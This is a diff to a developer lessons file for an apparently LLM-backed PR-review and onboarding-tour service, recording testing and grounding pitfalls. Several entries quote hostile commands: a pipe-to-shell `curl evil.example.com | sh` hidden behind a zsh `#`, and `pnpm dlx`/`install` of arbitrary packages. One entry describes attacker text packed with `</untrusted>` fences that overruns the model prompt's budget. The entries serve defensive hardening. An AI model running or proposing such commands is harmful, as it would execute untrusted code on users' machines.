@@ -8,7 +8,80 @@ Failures and surprises specific to this package. Repo-wide ones live in the root
 
 ## What Works
 
-_Nothing recorded yet._
+### Size a derivation change on real inputs with `tsx`, without paying for the endpoint that produces them
+
+A pure transform under `modules/*/helpers.ts` can be run over production-shaped input in one
+command, and on 2026-08-17 that is what turned "expect the count to drop" into "105 → 53":
+
+```sh
+curl -s localhost:3001/pulls/<id>/blast -o /tmp/blast.json     # the real indexed answer
+cd server && pnpm exec tsx /tmp/derive.ts                      # imports the real helpers
+```
+
+`tsx` resolves the tsconfig `paths` from the CWD, so a scratch script outside the repo can import
+`/…/server/src/modules/brief/helpers.js` and `@devdigest/shared` resolves inside it. Two reasons this
+beats the obvious alternatives: `POST /pulls/:id/brief`, the real entry point, spends a live model
+call for a derivation the model plays no part in, and both stored briefs on this machine have
+`index_matches_head = false`, which gates `ref_lines` to `[]` before the rule under test is reached.
+Re-running the same script with the old rule restored for one minute gives the before/after from the
+same code path rather than from a reimplementation of it — a Python model of the same rule agreed to
+the number, which is how the model was known to be trustworthy in the first place.
+
+### A test for "the cap counts matches" is not proved by the red run that motivated it
+
+Writing `test/git-list-files.test.ts` before `listFiles` learned `names` made seven of its cases
+fail on 2026-08-17, which proves nothing about ordering: they failed because the result was empty.
+The property that `maxFiles` slices **after** the filter was pinned separately, by mutating
+`walkDocs` to stop after 12 files *visited* and re-running — both cases in the "maxFiles counts
+matches" block went red, including the by-extension control. Two turns, and the mutation was
+reverted in the same session. When a test exists to fix the order of two operations, the only red
+run that means anything is the one where they are swapped.
+
+### When the mock refuses to model a rule, assert the QUESTION the module asked
+
+`plans/12` step P3.4 asked for a mock-backed case proving "nothing under `node_modules/` appears"
+in the package scan, and it is unwritable as stated: `MockGitClient.listFiles` does not model
+`EXCLUDED_WALK_DIRS` (recorded under *Codebase Patterns*), and its docstring forbids the fix that
+suggests itself — a second exclusion list in the module. Deleting the case loses a real criterion
+(AC-93); faking it loses the criterion **and** creates the duplicate.
+
+The way out on 2026-08-17 was to split the claim by owner. The exclusion is the port's, and it is
+proved once against `SimpleGitClient` over a temp clone (`test/git-list-files.test.ts`, "leaves out
+a manifest under an excluded directory"). What the MODULE owns is the options it passes, so
+`test/onboarding-gather.test.ts` records every `listFiles` call through a `RecordingGit extends
+MockGitClient` and asserts `names: ['package.json']`, `extensions: []`, `maxDepth`, and
+`maxFiles === PACKAGE_SCAN_LIMIT` with `PACKAGE_SCAN_LIMIT > MAX_PACKAGES`. That is not a weaker
+test of the same thing — it catches the failure the port cannot: a walk asked by extension, or
+asked for exactly the ceiling, excludes nothing however well the adapter behaves. Both mutations
+were run and both went red.
+
+Generally: a mock-backed test asserting a port's own behaviour is a test of the mock. Assert the
+call, and prove the behaviour once against the real adapter.
+
+### A supply requirement stated as a COUNT has to be measured before the constant is raised
+
+`getCriticalPaths` seeds a chain from a file and walks importer → imported, but `file_rank`
+rewards being *imported*: the best-ranked file in a repository is typically a leaf everyone
+depends on and imports nothing. Measured 2026-08-18 against the live index of
+`Holubinka/dev-digest` (656 ranked files, 1113 edges, 460 files with any out-edge), three rules
+over the same `getEdges` + `getRankedPaths(repoId, 100_000)` data:
+
+| Rule | Chains ≥2 files | Longest | Roots skipped for no out-edge |
+|---|---|---|---|
+| (a) today: top 5 roots by rank, depth 2 | **2** | 3 | 3 of 5 |
+| (b) the obvious raise: top 20 roots, depth 4 | **7** | 3 | 13 of 20 |
+| (c) walk the rank list, skip rootless roots, stop at 20 chains, depth 4 | **20** | 5 | 26 of 46 tried |
+
+So raising `CRITICAL_PATH_ROOTS` 5 → 20 buys 5 chains, not 15 — thirteen of the twenty best-ranked
+files have no out-edge at all. The requirement was written as "at least 20 chains are supplied",
+not as "20 roots", and that phrasing is what made the difference measurable instead of assumed.
+The recipe is the `.mts` scratch script already recorded below: `createDb` + the repository, or
+`new RepoIntelService({ config: { repoIntelEnabled: true }, db } as never)` to exercise the
+shipped method itself — a facade read needs no route, no container wiring and no model call.
+
+Generally: when an acceptance criterion names a delivered count, run the candidate rule over real
+data before touching the constant. The two-number version of this change would have shipped
+twenty rejected chains and no new ones.
 
 ## What Doesn't Work
 
@@ -212,7 +285,575 @@ copies left the two adapter copies untouched, and those were wrong in the same w
 extract a duplicated rule, grep for the rule's *shape* (`'.git'`, `segments[0]`), not for the
 function you are replacing; the copies that matter are the ones that never called it.
 
+### A fixture that spells two sources with the same string tests neither of them
+
+**Symptom.** `test/brief-allowed-refs.test.ts` asserted that the allowed-refs set follows what the
+prompt printed, and passed for six weeks over a `blastBlock` that seeded the set from
+`view.changed_files` — a list it never prints. The fixture set `changed_files: ['src/changed.ts']`
+and `symbols[0].file: 'src/changed.ts'`. Every assertion about `src/changed.ts` held whichever of
+the two put it there, so no case could distinguish them and none could fail.
+
+**Cause.** Realistic fixture values collapse. A path that plausibly appears in both a changed-file
+list and a symbol record will be written once, and the moment it is, the test stops being about
+which code path produced it.
+
+**Fix.** Give each source a value only it can supply — `changed_files: ['src/changed.ts',
+'src/unprinted.ts']` where no symbol names `src/unprinted.ts` — and then flip the code back to the
+broken shape and watch the new case fail. On 2026-08-16 that turned a green file into a failing
+one in one run. Same lesson as the `.git` entry above: the copies that matter are the ones nothing
+was ever pointed at.
+
+### Grounding by membership is not a bound on the answer
+
+**Symptom.** `groundBrief` (`modules/brief/helpers.ts`) filtered every model-written reference
+against the allowed set and shipped. Nothing capped the number of risks, the number of focus
+items, the repeats of one allowed path inside `file_refs`, the length of `what`/`why`, or the
+`dropped_refs` list — which is pure ungrounded model text. All of it goes to jsonb and out of
+every GET, over an input a PR author controls.
+
+**Cause.** A membership filter answers "was this name shown to the model", which reads like the
+whole safety question and is only half of it. The other half is "how much of this may a row
+carry", and the same allowed path repeated four hundred times passes the first test every time.
+
+**Fix.** Cap after the parse, never in the schema — Anthropic rejects `maxItems`/`maximum`, see
+the entry further down. The caps live in `modules/brief/constants.ts` under `output caps`
+(`MAX_RISKS`, `MAX_REVIEW_FOCUS`, `MAX_RISK_FILE_REFS`, `MAX_DROPPED_REFS`, `MAX_PROSE_CHARS`),
+next to the input caps, and `groundBrief` applies all of them. `ConventionsService.ground` slicing
+to `MAX_CANDIDATES` is the same move. Note the ordering: the risk cap runs AFTER the severity
+sort, so what it takes is the least severe, and the overflow is added to `dropped_risks` rather
+than disappearing.
+
+### An invariant maintained at the call site breaks once per call site
+
+**Symptom.** "A block's `refs` are exactly what its text printed" broke three times in three
+places on one feature, found by three different readers: refs built from the raw sources before
+the budget walk cut anything; refs seeded from `view.changed_files`, which no block prints; and
+`refs.add(...)` running before `clamp()` cut the line the name sat in. Each fix revealed the next
+one down. Three point fixes, one week, and the doc comment above `blastBlock` asserted the
+invariant held the whole time.
+
+**Cause.** The rule was written down twice — as a paragraph of comment and as a diagnostic in
+this file — and enforced nowhere. Every new call site had to re-derive it, and a comment claiming
+the invariant reads exactly the same whether or not the code below it still keeps it.
+
+**Fix.** Test the rule, not the sites. `test/brief-allowed-refs.test.ts` runs
+`[...buildAllowedRefs(fit.included)].filter(r => !fit.user.includes(r))` over a deliberately
+hostile view — every name longer than a rendered line, more changed files than `MAX_FILE_PATHS`,
+a spec the walk truncated beside one it dropped, a non-`full` status — and a new call site cannot
+be added without it. The signal that the fixture was the problem and not the coders: the four new
+cases failed against the code as shipped, while the eight old ones passed through two of the
+three holes. Cost of skipping this: rounds two and three of a review that was capped at two.
+
+### A budget measured before an escape is not a budget
+
+**Symptom.** `BRIEF_TOKEN_BUDGET` is 8000 and AC-18 counts the first assembled input against it
+before the call. Measured 2026-08-16 with `TiktokenTokenizer` and the real 914-token
+`risk-brief.system.md`: three linked spec files of `MAX_SPEC_FILE_CHARS` of the literal
+`</untrusted>` count **4521 tokens** in the budget walk and ship as **6021**, assembling to
+**9202 against 8000**. Both halves are attacker-controlled on a public repo — the `.md` is
+repository content and the PR body is what `parsePlanRefs` scans to choose it.
+
+**Cause.** `wrapUntrusted` rewrites `</untrusted>` to `<\/untrusted>` inside the content, which is
+not length-preserving (+8.3% at worst, +19% in tokens on this input). Every fixed block is wrapped
+inside `buildBlocks` and therefore measured after the rewrite; the specs were the one input handed
+to `selectWithinBudget` raw and wrapped afterwards, and nothing re-measured. A second, smaller
+leak of the same shape sat beside it: `selection.blocks.join('\n\n')` adds a blank line between
+survivors that the walk never counted, worth +2 with three spec files.
+
+**Fix.** Escape ONCE, per spec file, in `buildBlocks`, so the string the walk measures is the
+string sent — `escapeUntrusted` is now exported from `reviewer-core/src/prompt.ts` (and re-exported
+by `platform/prompt.ts`) precisely so a caller that measures can measure what ships. It is
+idempotent, so the `wrapUntrusted` that adds the fence afterwards finds nothing left to rewrite;
+`reviewer-core/test/prompt.test.ts` pins that over overlapping and nested attempts rather than
+assuming it. The inner joins are reserved for every candidate, conservatively, before the walk.
+
+**The rule the two leaks share, worth more than either.** Anything that TRANSFORMS text after the
+count is part of the count: a fence, an escape, a separator. `test/brief-budget.test.ts` had no
+fixture containing the fence literal, so the escape was a no-op in every case the suite exercised
+and only the fixture stood between this and shipping.
+
+### `stripNulDeep` over a whole values object silently empties every `Date` in it
+
+**Symptom.** `pr_brief` needed the NUL strip its neighbours already had (found 2026-08-17 by
+`/pr-self-review`, `major`). The one-line fix reads as `stripNulDeep(values)` — one call, every
+string, nothing to forget. It typechecks, because the helper is `<T>(value: T): T`, and it
+writes `{}` into `intent_computed_at`.
+
+**Cause.** `db/text.ts:51-60` rebuilds any non-array object from `Object.entries(value)`, and a
+`Date` has no own enumerable properties: `Object.fromEntries(Object.entries(new Date()))` is
+`{}`, and `instanceof Date` is then false. `BriefValues` mixes model jsonb with
+`intentComputedAt: Date | null`, so the generic signature promises a `BriefValues` back while
+handing a `timestamptz` column an empty object. Nothing in `tsc` can see it; whether the driver
+or Postgres rejects it depends on the column.
+
+**Fix.** Sanitise field by field — `stripNul` for the `text` columns, `stripNulDeep` for the
+`jsonb` ones — and leave everything else named in a comment with the reason it needs nothing
+(`modules/brief/repository.ts:8-31`). `stripNulDeep` is safe only over a value that is already
+JSON-shaped, which is exactly why `saveRunTrace` can pass it a whole `RunTrace` and a repository
+holding column values cannot pass it a whole row.
+
+### The NUL strip is a per-write-path obligation, and the fourth path missed it
+
+`pr_brief` is the third table to receive model output and the first to be written without the
+guard: `insertReview` (`modules/reviews/repository/review.repo.ts:39-40`), `insertFindings`
+(`:60-69`) and `saveRunTrace` (`repository/run.repo.ts:186`) all carry it, `upsertBrief` did not,
+and `review.repo.ts:34` was edited on the same branch that added `upsertBrief` — the rule was on
+screen while the new table was left out of it.
+
+`pnpm arch` cannot see this, `tsc` cannot see this, and the brief's own unit suite could not:
+`test/brief-service.test.ts` fakes the repository, so the only place the constraint exists is
+real Postgres. The check that works is one grep per new table that stores model output —
+`grep -n 'stripNul' src/modules/<m>/repository.ts` — plus an `*.it.test.ts` case that inserts
+`String.fromCharCode(0)` through the repository, both halves of any upsert included: the
+`onConflictDoUpdate.set` object is a second, separate parameter list, and it is the one every
+recomputation of an existing state goes through.
+
+### Grouping by a nullable column collapses every unknown into one group, and a ranking rule then compares things that were never comparable
+
+**Symptom.** `pickListReview` (`src/modules/pulls/helpers.ts`) was written on 2026-08-17 to give
+the PR list the rule the PR page's banner already used: settle which commit the score speaks for,
+then take the most blocking review *of that commit*. Eight unit tests passed, including one
+written specifically to prove that a `request_changes` from an older commit cannot outrank an
+`approve` on the current one. On live data the function still did exactly that.
+
+**Cause.** `reviews.head_sha` was added late and nothing backfilled it, so almost every stored
+review has none — 69 of PR #7's 69 in this workspace, spanning the whole branch. Grouping by
+`head_sha` puts all of those in one group, because `null === null`. That group is not one state;
+it is many unknown ones. Ranking inside it by verdict then surfaces a `request_changes` from three
+weeks ago as the PR's current score. The guard test could not catch it: its fixtures had real
+shas, so it exercised the branch where grouping works.
+
+**Fix.** Rank by verdict only when the group is a KNOWN state, and take the newest when it is not
+(`helpers.ts`, `const ranked = state ? byMostBlockingThenNewest : byNewestThenId`). More generally:
+when a rule partitions rows by a nullable column, write the fixture where that column is null
+before believing the rule, because that is the majority of the table and not the corner of it.
+
+**How it was found, which is the transferable part.** One query, before touching the UI:
+`select p.number, rv.head_sha, count(*) … group by p.number, rv.head_sha` printed the shape of the
+data the rule would meet. The whole defect was visible in its first row. A `psql` count over the
+real table is two minutes and it is not something a fixture can substitute for — the fixtures were
+written from the schema, and the schema says `head_sha` is nullable without saying that it is
+almost always null.
+
+### `repo_index_state` is never stamped `failed`, and a comment promises that it is
+
+`server/src/modules/repo-intel/pipeline/full.ts:64-70` states, in a doc comment on `runFullIndex`:
+"Errors that abort the whole run still stamp a `status='failed'` row before re-throwing — the handler
+is idempotent on retry." Nothing does. The only `status: 'failed'` written anywhere in the repository
+is the **job** row at `server/src/platform/jobs.ts:91`.
+
+The read side is intact and correct — `server/src/modules/repo-intel/repository.ts:218` maps
+`'degraded' | 'failed'` onto `index_failed` — so the branch is live on read and dead on write. The
+consequence is user-visible: an index that crashed mid-run is indistinguishable from one that never
+started, and the only reachable degraded reason today is the persisted `no_clone`.
+
+Found 2026-08-17 while planning `SPEC-03`, whose AC-83 needs three distinguishable refusal reasons
+and can reach two. Fix is a `catch` in `runFullIndex` that stamps before re-throwing, planned as step
+P1.9 of `plans/13-onboarding-tour-server-api.md`; the stamp must carry the previous facts forward
+rather than zeroes, because `upsertIndexState` writes every column and zeroing `lastIndexedSha` would
+break the sha that `server/src/modules/blast/service.ts:100-113` renders every line number against.
+
+The lesson beyond the defect: **the comment is why it survived.** A comment asserting behaviour that
+does not exist reads as verification to everyone downstream, and three features consumed this one.
+When a status value matters, grep for its *writer*, not for the sentence that claims it.
+
+### A command modelled as `{ script, command, why }` cannot express `cp` or `docker compose`
+
+**Symptom.** The onboarding tour's "How to run" section comes out of the pipeline without a
+database: for DevDigest it can emit `pnpm install` and `pnpm dev` and nothing that creates a
+`.env` or starts Postgres, so nobody can bring the project up by following it. Every gate is
+green — `pnpm arch`, both typechecks, the contract round-trip — because the shape is internally
+consistent; it is only wrong against the screen it has to fill.
+
+**Cause.** `OnboardingCommand.script` is a key of that package's `package.json`, and grounding
+keeps a command only when the key exists (AC-23). That makes `<manager> run <script>` the only
+expressible command. `cp .env.example .env` and `docker compose up -d postgres` have no manifest
+key at all, so they were not "dropped" — they were never sayable. The mockup
+`specs/assets/SPEC-03-onboarding-tour.png` draws both of them, and the contract silently decided
+the screen could not.
+
+**Fix.** A repo-level `OnboardingSetupCommand { command, why, source_path }` beside `packages`
+(`vendor/shared/contracts/knowledge.ts`), where `source_path` is the file that AUTHORISES the
+command — the `.env.example` a `cp` reads from, the `COMPOSE_FILES` entry a compose command acts
+on — and grounding keeps it only when that file exists and, for compose, declares every service
+named. The general lesson is the cheap check: **read the contract against the source material
+before writing the code, one field per drawn element.** This was found on 2026-08-17 by
+`plan-verifier` doing exactly that, after the plan itself had considered the case (its
+Recommendation 1) and declined it, and after the implementation had passed its own gates.
+
+### A status the reader handles is no evidence that anything writes it
+
+**Symptom.** `modules/repo-intel/repository.ts:218` maps `'degraded' | 'failed'` onto a degraded
+`IndexState`, and the docstring on `runFullIndex` (`pipeline/full.ts:64-70`) stated that an error
+aborting the run "still stamp[s] a `status='failed'` row before re-throwing". Neither was true of
+the writer: for the whole life of the module no code path wrote `status: 'failed'` to
+`repo_index_state`, so a crashed index was indistinguishable from one that never ran. Fixed
+2026-08-17 (plan 13, P1.9).
+
+**Cause.** The branch was live on read and dead on write, and a comment asserting the write is
+what let it stay that way — every downstream reader treated the docstring as the check. Nothing
+can fail here: the reader's branch is simply never taken, so no test, typecheck or `pnpm arch`
+has anything to report.
+
+**Fix.** For any status value a reader special-cases, grep the writers before believing it is
+reachable: `grep -rn "status: 'failed'" server/src` returned exactly one hit, and it was the
+*job* row (`platform/jobs.ts:91`), a different table. Do this before building a feature that gates
+on the value — plan 13's AC-83 had a refusal reason that could never fire.
+
+### A length cap applied to a string that will be EXECUTED has to reject it, not truncate it
+
+**Symptom.** Every free string in `modules/onboarding/helpers.ts` is cut to `MAX_LINE_CHARS` with
+`truncateCodePoints`, which is right for a title, a note or a `why`. Applied to the same file's
+`command` fields it is a defect with no visible symptom: `docker compose up -d postgres redis`
+truncated at a character boundary is `docker compose up -d postgres red`, which is still a
+syntactically valid line, is still shown with a copy control, and now names a service that does
+not exist. Cutting `cp .env.example .env` mid-token gives `cp .env.example .en`, which happily
+creates a file nobody expected.
+
+**Cause.** A cap is a bound on storage, and truncation is the storage-shaped answer to it. It is
+correct exactly while the string is prose — something a human reads and can see is cut. The moment
+the string is an instruction the human will run, a truncation is not a shorter version of the
+claim, it is a DIFFERENT claim that still executes. Nothing distinguishes the two in the type
+system: both are `string`.
+
+**Fix.** `withinCommandCap` rejects an over-long command and counts it as a dropped claim
+(`modules/onboarding/helpers.ts`, applied to every setup command, install command and package
+command). The general rule for this repo: prose gets `truncateCodePoints`, anything destined for a
+shell or a URL gets a length TEST and a drop. When adding a cap, ask what the string is for before
+choosing which one — the two look identical at the call site (2026-08-17, plan 12 P4).
+
+### `repoIntel.getRepoMap(repoId, budget)` answers empty for every budget but 1500
+
+**Symptom.** The onboarding generation's highest-priority input arrived as
+`repo_map: missing` on the first real run against `Holubinka/dev-digest`, a repository whose
+index state is `full` with 656 files. No error, no `degraded` flag anywhere the caller looked —
+just an empty string, and a tour written from file samples and `README.md` alone.
+
+**Cause.** `getRepoMap` is a CACHE READ, not a render (`modules/repo-intel/service.ts:437-454`).
+The pipeline stores exactly one row per commit, at `DEFAULT_REPO_MAP_TOKEN_BUDGET = 1500`
+(`repo-intel/constants.ts:61`, written from `pipeline/full.ts:240` and
+`pipeline/incremental.ts:228`), and the lookup matches `(repoId, commitSha, tokenBudget)`
+exactly. Any other number misses and returns `{ text: '', tokens: 0, degraded: true }`. The
+facade's own docstring says so; the caller had picked 6000 as "a quarter of the token budget",
+which is a reasonable number and an unreachable one.
+
+**Fix.** Ask for `DEFAULT_REPO_MAP_TOKEN_BUDGET`, or nothing at all — the parameter defaults to
+it. Measured 2026-08-17 on this repo at `lastIndexedSha 2f8b7e19`: budget 6000 → 0 chars,
+budget 1500 → 6215 chars / 1497 tokens. The check is two lines of `tsx` against a real repo id,
+and no unit test can see it: a stub facade returns whatever the test made it return.
+
+**Correction, 2026-08-17 (fix round).** The last sentence is true only of tests that go THROUGH
+the facade. A test that imports both constants and asserts equality sees the drift perfectly
+well, needs no repo and no DB, and is now in place: `test/onboarding-gather.test.ts`, "the
+repo-map budget is the pipeline’s number, not a preference". Against the old value it fails with
+`expected 6000 to be 1500`. `REPO_MAP_TOKEN_BUDGET` is now 1500
+(`modules/onboarding/constants.ts`). The reason this belongs in a test rather than in an import
+is that `no-cross-module` forbids `modules/onboarding/**` naming `modules/repo-intel/**`, and
+`pnpm arch` cruises `src` only (`"arch": "depcruise src …"`), so a file under `test/` is bound by
+no such rule. Generalise it: any constant that has to EQUAL another module's constant — rather
+than merely resemble it — gets a two-line equality test, the same move as "excluded_dirs is an
+echo of the walk" in `test/onboarding-packages.test.ts`. The alternative, a comment saying "keep
+these in sync", is what produced this entry.
+
+### A set filled by two producers stays half-filled until a fixture crosses the ceiling
+
+`OnboardingSources.knownPaths` is documented in three places as "every path a read OR THE WALK
+returned" (`generation-types.ts:114`, `gather-executor.ts:78`, plan 12 step P3.2). Only the read
+half was ever wired: `knownPaths.add` appeared once, in the private `read` helper. Nothing caught
+it for a whole package — not typecheck, not `pnpm arch`, not the eleven cases in
+`test/onboarding-gather.test.ts`, and not the two that assert `knownPaths` by exact contents.
+
+The reason is worth remembering, because it generalises past this file. **Below the ceiling the
+two producers are indistinguishable.** With ≤ `MAX_PACKAGES` (12) manifests, every path the walk
+returned is also a path `describePackage` re-reads, so the read half alone produces exactly the
+right set and every fixture agrees. The halves diverge only when `found > shown` — and the one
+test that built 71 packages asserted `packages`, `found` and `bounded`, never `knownPaths`.
+
+The cost is not cosmetic: a manifest the walk found and the ceiling cut is proven to exist, and
+leaving it out makes the downstream grounding spend one of `MAX_PATH_PROBES` re-asking, then count
+the path `unknown_path` once the budget is gone — the feature reporting "no such file" about a
+file it listed itself one step earlier.
+
+**What to check.** When a value has two documented producers, write the fixture where only one of
+them can supply the answer, and assert the value there. For a bounded collector that means one
+fixture strictly past the bound; a below-the-bound fixture is a test of the union, not of either
+half. Verified against the real adapter over a 21-package clone on disk: `found` 21, `shown` 12,
+all 21 manifests in `knownPaths`, and nothing from `node_modules/`.
+
+### Raising a ceiling moves an alphabetical slice; only the ordering removes it
+
+`GitClient.listFiles` sorted matches by path and then `slice(0, maxFiles)`. `PACKAGE_SCAN_LIMIT`
+was raised from 12 to 64 to stop that cut dropping the root `package.json`, and
+`gather-executor.ts`, `packages.ts` and `constants.ts` each carried a docstring saying the
+problem was solved because the port now counts MATCHES rather than visited files. It was not:
+counting matches changes WHICH things are counted toward the bound, never which of them the
+bound keeps. Reproduced 2026-08-18 with 65 `apps/aNNN/package.json` plus a root manifest — the
+port returned 64 files with no root among them and `selectPackages(...).shown[0]` was
+`apps/a000`, because `apps/` precedes `package.json`. `next.js` is this fixture in the wild,
+with ~300 manifests under `examples/`.
+
+**Fix.** `adapters/git/order.ts` sorts by depth first, then path, and both `SimpleGitClient` and
+`MockGitClient` use it. The root then survives by construction rather than by alphabetical luck,
+and the ceiling is spent on the deepest entries. **What to check:** when a bound is the thing
+that decides which items survive, the question is never "is the bound large enough" — write the
+fixture at bound + 1 and assert WHICH item the cut took.
+
+### Checking a command's two ends is not checking the command
+
+Three grounding gates in `modules/onboarding/helpers.ts` each tested a prefix and a membership
+and left the middle unexamined, and all three were reachable by a public repo's README text on a
+line rendered with a copy control. Confirmed by running the strings, 2026-08-18:
+
+- `parts[0] === manager && INSTALL_VERBS.has(parts[1])` with no length bound accepted
+  `pnpm install evil-pkg`; `npm install <pkg>` runs that package's `postinstall`.
+- `parts[0] === manager && parts.includes(script)` accepted `pnpm dlx evil-cli dev` whenever
+  `dev` was a real script — `pnpm dlx` / `npm exec` / `yarn dlx` fetch and run an arbitrary
+  registry package — and `pnpm --dir /elsewhere dev` the same way.
+- `from === sourcePath && to !== null` accepted `cp .env.example server/src/index.ts`, so the
+  destination of a copy was any relative non-`.git` path.
+
+A safe TOKEN CLASS is not a safe command: `;`, `&&` and backticks were already impossible, and
+every one of these lines is built from allowed characters only. **What to check:** state the
+shape as a whole token sequence (`<manager>`, optional `run`, `<script>`, end) and test the
+sequence. Where a docstring asserts an invariant, read it as a claim to falsify — all three of
+these sat directly under a comment saying the opposite.
+
+### `#` is not a comment in the shell the reader is actually in
+
+A generated command rendered beside a copy control may not carry a trailing `#` explanation, and
+the reasoning that says it may is wrong in a way that survives review. Round 1 of
+`plans/12-onboarding-tour-server-generation.md` added comment support on "a comment is inert —
+nothing after `#` executes"; round 2 and a human decision on 2026-08-18 reverted it whole.
+
+`#` is inert in POSIX sh and in bash. It is **not** inert in an INTERACTIVE zsh, which is the
+shell on this project's machines: `INTERACTIVE_COMMENTS` is off by default, so `#` is an ordinary
+word. Verify in one line — `zsh -ic 'echo $options[interactivecomments]'` prints `off` (zsh 5.9,
+macOS, 2026-08-18). A stored `pnpm dev # && curl evil.example.com | sh` therefore runs the `curl`
+the moment it is pasted.
+
+And no character filter rescues it, which is the half that makes this a decision rather than a
+regex to tune: the comment has to carry the tour's prose, which is Ukrainian
+(`modules/onboarding/constants.ts`, `TOUR_LANGUAGE`), so commas, parentheses and apostrophes — and
+in an interactive zsh `(` opens a subshell and `'` opens a quote. The characters the prose needs
+and the characters that make a paste dangerous are the same characters.
+
+**What to do instead.** Keep the command a command and give the prose its own field. Every
+onboarding command already carries a `why` that is normalised through `line()`, rendered beside
+the command and never executed. `#` is outside `SAFE_COMMAND_TOKEN`
+(`modules/onboarding/helpers.ts`), so a `#`-bearing line is dropped whole, and the mockup
+`specs/assets/SPEC-03-onboarding-tour.png` — which draws the comment inline — is a recorded,
+approved divergence rather than a defect.
+
+### An obligation one contract file states about another is carried by nothing
+
+**Symptom.** `contracts/onboarding-api.ts` opens with "PARSE-ON-READ IS LOAD-BEARING HERE …
+every field added to it later needs a `.default(...)` — a count `.default(0)`, an array
+`.default([])` … The same obligation runs through `OnboardingDraft`, and it is stated there
+too." It was not stated there. On 2026-08-18, not one of the 21 counts and arrays in
+`Onboarding`, `OnboardingDraft` or the shapes they contain carried a default: the slice that
+owned `contracts/knowledge.ts` finished before the slice that wrote the sentence about it.
+
+**Cause.** The sentence is a claim about a second file, written in prose, in a repository where
+the two files belong to two different work packages. Nothing reads it. `tsc` typechecks a schema
+with defaults and one without identically, `pnpm arch` sees no dependency, and the seam test that
+does exist (`test/onboarding-contract.test.ts`) asserts key identity across `.extend()` — a
+different property. The first signal would have been a reader opening a saved tour, months later,
+after some new field landed: `OnboardingRepository.get` degrades a failed parse to `null`, so the
+page says "nothing generated yet, press Generate" about a tour that is whole in the jsonb column
+and was paid for once.
+
+**Fix.** The defaults, and two tests that fail without them, in `test/contracts.test.ts` — "a
+document written before the counts and arrays existed parses to zeros and empty lists" and its
+nested sibling. Both work by STRIPPING keys from the fixture rather than by listing what should
+be defaulted, which is what makes them fail on the day someone adds a field and forgets.
+
+The durable form, not written here, is structural: walk `Object.keys(OnboardingDraft.shape)` and
+assert every `ZodArray` and every `ZodNumber` is wrapped in a `ZodDefault`. A prose obligation
+between two contract files should be read as unimplemented until a test names it.
+
+### `last_indexed_sha` is not a witness that the index changed
+
+**Symptom.** A gate reads `repoIntel.getIndexState(repoId)`, long work follows, and the result is
+stamped with the state the gate approved. A reindex that lands inside that window is invisible to
+any check that compares `lastIndexedSha`, because a manual `POST /repos/:id/resync` on an
+unchanged HEAD writes the row back with the sha it already had. Found 2026-08-18 in
+`modules/onboarding/service.ts` during review of the tour: a ~2-minute generation could be built
+from an emptied index and saved looking perfectly fresh.
+
+**Cause.** Two facts that only bite together. `repo-intel/pipeline/full.ts` calls
+`repository.deleteAllForRepo(repoId)` — every symbol and every reference for the repo — around 65
+lines BEFORE it writes the new `repo_index_state` row, so for the whole middle of a reindex the
+state row still says `full` while the index it describes is empty. And the state row is keyed by
+sha in everyone's head but not in fact: a same-HEAD resync changes no sha, so `isStale` answers
+`false` about a tour built from nothing.
+
+**Fix.** Compare `updatedAt`. Every writer of that row bumps it — `upsertIndexState`,
+`touchIndexState` and `advanceSha`, `repo-intel/repository.ts:294`, `:327`, `:339` — so it is the
+only field that moves on every rewrite. `modules/onboarding/status.ts` has it as `indexMoved(before,
+after)`, and `service.ts` re-reads the state after the generator returns and refuses the write with
+a 409 rather than saving. The check costs one extra read per generation; the alternative was a thin
+document that no gate and no reader could tell from a good one.
+
+**Where else this applies.** Any consumer that gates on `getIndexState` and then does slow work on
+what the index holds. `blast` and `brief` read the facade the same way; neither re-checks today,
+and neither writes a document stamped with the state, which is why the same race is cheaper there —
+but a "the index was full when I asked" read is a statement about a moment, not about the request.
+
+
+### The last input of a budget walk is all-or-nothing unless it is offered item by item
+
+**Symptom.** The Onboarding Tour's `project_docs` input was `dropped` on every real generation of
+this repository, never `truncated` and never partly included — so the tour that shipped on
+2026-08-18 was written having seen neither `README.md` nor `AGENTS.md`. The stored record said so
+plainly and nobody read it: `{"id":"project_docs","status":"dropped","tokens":3216,"detail":null}`.
+
+**Cause.** `modules/_shared/budget.ts` stops at the FIRST candidate that does not fit and marks it
+and everything after it `dropped`; it truncates only when `blocks.length === 0`, i.e. only the very
+first candidate. So any candidate that is not first is included whole or not at all. `project_docs`
+is last by D13 priority, and `SAMPLE_FILE_COUNT` (20) × `MAX_FILE_CHARS` (6 000) took 17 964 of the
+~22 000 block tokens ahead of it — measured 2026-08-18 against
+`server/clones/Holubinka/dev-digest`, repo map 1 514, configs 753, chains 60. The 3 216 tokens of
+documents never had 3 216 tokens of room, and 1 773 tokens of budget went unspent every run.
+
+**Fix.** Offer the input one item at a time, the way `file_samples` already is in
+`generate-executor.ts` `buildCandidates`. Splitting `project_docs` per document turned the same run
+into `1 of 7 documents` — an answer instead of a refusal — with no other input losing a single
+token, because it spent headroom that was already idle. A per-item cap is what makes the split
+worth having: without `MAX_DOC_CHARS`, one 12 985-character `mcp/README.md` stops the walk and takes
+every document behind it, which is the whole-block failure again one level down.
+
+**Where else this applies.** Any caller of `selectWithinBudget` whose last candidate is a
+multi-item block. Check `inputs[]`-style records for a row that is only ever `included` or
+`dropped`: a status that never takes its middle value is the signature.
+
+**2026-08-18, later the same day.** Splitting per item was not enough on its own — it bought
+`1 of 7 documents`, because 19 samples still stood ahead and left ~1 500 tokens. A human then
+reversed the priority pair, and the same clone measured `7 of 7 documents` against
+`13 of 19 files`: the documents cost 7 077 tokens and displaced 6 samples worth 6 079. Two things
+this teaches beyond the first fix. Splitting an input changes what a starved input DOES (drops its
+tail instead of vanishing) but not whether it is starved — that is the ORDER, and only the order.
+And the order is stated in three places that have to agree: `OnboardingInputId` in
+`vendor/shared/contracts/knowledge.ts` (which builds the record's rows, so it decides the screen),
+`buildInputBlocks` in `prompt.ts`, and `buildCandidates` in `generate-executor.ts`. Leaving the
+enum stale while moving the walk compiles, passes `pnpm arch`, and silently prints the rows in an
+order that no longer explains which one got cut.
+
+### `inputs[].detail` is where a per-item cap becomes observable, and it is easy to leave null
+
+**Symptom.** `MAX_DOC_CHARS` cuts a document before it is fenced, so by the time anything can be
+recorded the block holds the capped text and "this was cut" is no longer decidable from it.
+
+**Cause.** The cap runs in `prompt.ts` `fencedItem`, the record is built in `generate-executor.ts`
+`inputRow`, and nothing travels between them but the rendered block.
+
+**Fix.** Carry the fact on the candidate (`InputCandidate.docShortened`) and spend it on the one
+free-form field the contract already has: `detail` now reads `1 of 7 documents, 1 shortened`.
